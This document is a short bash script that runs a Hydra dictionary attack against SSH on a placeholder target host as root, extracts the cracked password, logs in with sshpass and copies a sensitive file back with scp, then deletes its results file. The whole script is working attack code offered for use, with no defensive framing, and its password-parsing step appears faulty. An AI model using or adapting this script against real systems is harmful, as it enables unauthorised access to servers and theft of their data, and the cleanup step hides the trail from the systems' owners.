#!/bin/bash

# Store the target host information
host=<target_host_ip>
port=22
username=root
secrets_file_path=/tmp/sensitive-info.txt
local_path=/tmp/

# Use Hydra to launch a dictionary attack against the target host
hydra -l $username -P passwd.txt $host ssh -o result.txt

# Extract the password from the result of the Hydra attack
password=$(grep 'login:password' result.txt | awk '{print $3}')

# Use the extracted password to log in to the target host and retrieve the secrets file
sshpass -p "${password}" scp "${username}@${host}:${secrets_file_path}" "${local_path}"

# Clean up the result file
rm result.txt